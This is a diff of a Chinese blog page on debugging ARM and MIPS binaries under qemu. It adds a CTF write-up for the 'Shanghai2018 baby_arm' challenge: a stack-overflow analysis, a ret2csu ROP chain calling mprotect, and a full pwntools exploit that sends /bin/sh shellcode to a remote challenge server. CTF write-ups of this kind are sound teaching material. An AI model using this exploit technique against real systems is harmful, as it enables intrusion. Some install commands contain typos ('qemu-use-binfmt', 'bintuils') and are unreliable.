@@ -69,7 +69,7 @@
 
 <meta itemprop="datePublished" content="2018-07-31T20:00:54&#43;08:00" />
 <meta itemprop="dateModified" content="2018-07-31T20:00:54&#43;08:00" />
-<meta itemprop="wordCount" content="4668">
+<meta itemprop="wordCount" content="5662">
 
 
 
@@ -313,8 +313,8 @@
             <a href="https://bash-c.github.io/categories/how2/"> how2 </a>
             
           </div>
-        <span class="more-meta"> 4668 words </span>
-          <span class="more-meta"> 10 min read </span>
+        <span class="more-meta"> 5662 words </span>
+          <span class="more-meta"> 12 min read </span>
 
         
         
@@ -363,6 +363,12 @@
 <li><a href="#思路分析">思路分析</a></li>
 <li><a href="#exp">exp</a></li>
 </ul></li>
+<li><a href="#shanghai2018-baby-arm">Shanghai2018 - baby_arm</a>
+<ul>
+<li><a href="#静态分析-2">静态分析</a></li>
+<li><a href="#思路-1">思路</a></li>
+<li><a href="#notice">notice</a></li>
+</ul></li>
 <li><a href="#more-1">More</a></li>
 <li><a href="#后记">后记</a></li>
 <li><a href="#reference-1">Reference</a></li>
@@ -400,18 +406,16 @@
 <h3 id="预备环境安装">预备环境安装：</h3>
 
 <ul>
-<li>安装 git，gdb 和 gdb-multiarch，同时安装 binfmt 用来识别文件类型</li>
+<li>安装 git，gdb 和 gdb-multiarch</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
 </span><span class="lnt">2
-</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo apt-get update
-$ sudo apt-get install git gdb gdb-multiarch
-$ sudo apt-get install <span class="s2">&#34;binfmt*&#34;</span></code></pre></td></tr></table>
+$ sudo apt-get install git gdb gdb-multiarch</code></pre></td></tr></table>
 </div>
 </div>
 <ul>
@@ -448,9 +452,11 @@ $ ./setup.sh</code></pre></td></tr></table>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo apt-get install qemu-user</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo apt-get install qemu-user
+$ sudo apt-get install qemu-use-binfmt qemu-user-binfmt:i386</code></pre></td></tr></table>
 </div>
 </div>
 <p>通过 qemu 模拟 arm/mips 环境，进而进行调试</p>
@@ -471,7 +477,7 @@ $ ./setup.sh</code></pre></td></tr></table>
 <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ apt-cache search <span class="s2">&#34;libc6&#34;</span> <span class="p">|</span> grep ARCH</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ apt search <span class="s2">&#34;libc6-&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;ARCH&#34;</span></code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5cudid7gj30xy0h7trd.jpg" alt="" /></p>
@@ -919,12 +925,10 @@ pwndbg&gt; cyclic -l 0x62616164
 </span><span class="lnt">41
 </span><span class="lnt">42
 </span><span class="lnt">43
-</span><span class="lnt">44
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
-<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -1116,6 +1120,312 @@ pwndbg&gt; cyclic -l 0x62616164
     <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
 </div>
 </div>
+<h2 id="shanghai2018-baby-arm">Shanghai2018 - baby_arm</h2>
+
+<h3 id="静态分析-2">静态分析</h3>
+
+<p>题目给了一个 <code>aarch64</code> 架构的文件，没有开 canary 保护</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">Shanghai2018_baby_arm <span class="o">[</span>master<span class="o">]</span> check ./pwn 
++ file ./pwn
+./pwn: ELF <span class="m">64</span>-bit LSB executable, ARM aarch64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, <span class="k">for</span> GNU/Linux <span class="m">3</span>.7.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e988eaee79fd41139699d813eac0c375dbddba43, stripped
++ checksec ./pwn
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn&#39;</span>
+    Arch:     aarch64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>看一下程序逻辑</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kr">__int64</span> <span class="nf">main_logic</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">Init</span><span class="p">();</span>
+  <span class="n">write</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&#34;Name:&#34;</span><span class="p">,</span> <span class="mi">5LL</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="mi">512LL</span><span class="p">);</span>
+  <span class="n">sub_4007F0</span><span class="p">();</span>
+  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">sub_4007F0</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// [xsp+10h] [xbp+10h]
+</span><span class="c1"></span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v0</span><span class="p">,</span> <span class="mi">512LL</span><span class="p">);</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>程序的主干读取了 512 个字符到一个全局变量上，而在 <code>sub_4007F0()</code> 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 <code>frame pointer + 0x10</code> 开始读取，因此即使开了 canary 保护也无所谓。</p>
+
+<h3 id="思路-1">思路</h3>
+
+<p>理一下思路，可以直接 rop，但我们不知道远程的 libc 版本，同时也发现程序中有调用 <code>mprotect</code> 的代码段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-assembly" data-lang="assembly">.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
+.text:00000000004007CC                 MOV             X29, SP
+.text:00000000004007D0                 MOV             W2, #0
+.text:00000000004007D4                 MOV             X1, #0x1000
+.text:00000000004007D8                 MOV             X0, #0x1000
+.text:00000000004007DC                 MOVK            X0, #0x41,LSL#16
+.text:00000000004007E0                 BL              .mprotect
+.text:00000000004007E4                 NOP
+.text:00000000004007E8                 LDP             X29, X30, [SP],#0x10
+.text:00000000004007EC                 RET</code></pre></td></tr></table>
+</div>
+</div>
+<p>但这段代码把 <code>mprotect</code> 的权限位设成了 0，没有可执行权限，这就需要我们通过 rop 控制 <code>mprotect</code> 设置如 bss 段等的权限为可写可执行</p>
+
+<p>因此可以有如下思路：</p>
+
+<ol>
+<li>第一次输入 name 时，在 bss 段写上 shellcode</li>
+<li>通过 rop 调用 mprotect 改变 bss 的权限</li>
+<li>返回到 bss 上的 shellcode</li>
+</ol>
+
+<p><code>mprotect</code> 需要控制三个参数，可以考虑使用 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu">ret2csu</a> 这种方法，可以找到如下的 gadgets 来控制 <code>x0, x1, x2</code> 寄存器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-assembly" data-lang="assembly">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
+.text:00000000004008B0                 MOV             X2, X22
+.text:00000000004008B4                 MOV             X1, X23
+.text:00000000004008B8                 MOV             W0, W24
+.text:00000000004008BC                 ADD             X19, X19, #1
+.text:00000000004008C0                 BLR             X3
+.text:00000000004008C4                 CMP             X19, X20
+.text:00000000004008C8                 B.NE            loc_4008AC
+.text:00000000004008CC
+.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j
+.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
+.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
+.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
+.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
+.text:00000000004008DC                 RET</code></pre></td></tr></table>
+</div>
+</div>
+<p>最终的 <a href="https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py">exp</a> 如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./pwn&#34;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-aarch64&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/aarch64-linux-gnu&#34;</span><span class="p">,</span> <span class="s2">&#34;./pwn&#34;</span><span class="p">])</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-aarch64&#34;</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/aarch64-linux-gnu&#34;</span><span class="p">,</span> <span class="s2">&#34;./pwn&#34;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;106.75.126.171&#34;</span><span class="p">,</span> <span class="mi">33865</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">csu_rop</span><span class="p">(</span><span class="n">call</span><span class="p">,</span> <span class="n">x0</span><span class="p">,</span> <span class="n">x1</span><span class="p">,</span> <span class="n">x2</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x4008CC</span><span class="p">,</span> <span class="s1">&#39;00000000&#39;</span><span class="p">,</span> <span class="mh">0x4008ac</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">call</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">x2</span><span class="p">,</span> <span class="n">x1</span><span class="p">,</span> <span class="n">x0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;22222222&#39;</span>
+    <span class="k">return</span> <span class="n">payload</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">,</span> <span class="n">checksec</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+    <span class="n">padding</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov x0, x0&#39;</span><span class="p">)</span>
+
+    <span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
+    <span class="c1">#  print disasm(padding * 0x10 + sc)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Name:&#34;</span><span class="p">,</span> <span class="n">padding</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">sc</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+
+    <span class="c1">#  io.send(cyclic(length = 500, n = 8))</span>
+    <span class="c1">#  rop = flat()</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">72</span><span class="p">),</span> <span class="n">csu_rop</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__gmon_start__&#39;</span><span class="p">],</span> <span class="mi">8</span><span class="p">))</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x400824</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">flat</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]))</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+
+    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Name:&#34;</span><span class="p">,</span> <span class="n">padding</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">sc</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">72</span><span class="p">),</span> <span class="n">csu_rop</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__gmon_start__&#39;</span><span class="p">],</span> <span class="mh">0x411000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">7</span><span class="p">))</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x411068</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="notice">notice</h3>
+
+<p>同时需要注意的是，<code>checksec</code> 检测的结果是开了 nx 保护，但这样检测的结果不一定准确，因为程序的 nx 保护也可以通过 qemu 启动时的参数 <code>-nx</code> 来决定（比如这道题目就可以通过远程失败时的报错发现程序开了 nx 保护），老版的 qemu 可能没有这个参数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">Desktop ./qemu-aarch64 --version
+qemu-aarch64 version <span class="m">2</span>.7.0, Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2003</span>-2016 Fabrice Bellard and the QEMU Project developers
+Desktop ./qemu-aarch64 -h<span class="p">|</span> grep nx
+-nx           QEMU_NX           <span class="nb">enable</span> NX implementation</code></pre></td></tr></table>
+</div>
+</div>
+<p>如果有如下的报错，说明没有 aarch64 的汇编器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>ERROR<span class="o">]</span> Could not find <span class="s1">&#39;as&#39;</span> installed <span class="k">for</span> ContextType<span class="o">(</span><span class="nv">arch</span> <span class="o">=</span> <span class="s1">&#39;aarch64&#39;</span>, <span class="nv">binary</span> <span class="o">=</span> ELF<span class="o">(</span><span class="s1">&#39;/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn&#39;</span><span class="o">)</span>, <span class="nv">bits</span> <span class="o">=</span> <span class="m">64</span>, <span class="nv">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span>, <span class="nv">log_level</span> <span class="o">=</span> <span class="m">10</span><span class="o">)</span>
+    Try installing binutils <span class="k">for</span> this architecture:
+    https://docs.pwntools.com/en/stable/install/binutils.html</code></pre></td></tr></table>
+</div>
+</div>
+<p>可以参考官方文档的解决方案</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> apt search binutils<span class="p">|</span> grep aarch64
+p   binutils-aarch64-linux-gnu                                         - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target                           
+p   binutils-aarch64-linux-gnu:i386                                    - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target                           
+p   binutils-aarch64-linux-gnu-dbg                                     - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target <span class="o">(</span>debug symbols<span class="o">)</span>           
+p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target <span class="o">(</span>debug symbols<span class="o">)</span>     
+Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> sudo apt install bintuils-aarch64-linux-gnu</code></pre></td></tr></table>
+</div>
+</div>
+<blockquote>
+<p>aarch64 的文件在装 libc 时是 <code>arm64</code>，在装 <code>binutils</code> 时是 <code>aarch64</code></p>
+</blockquote>
+
 <h2 id="more-1">More</h2>
 
 <ul>
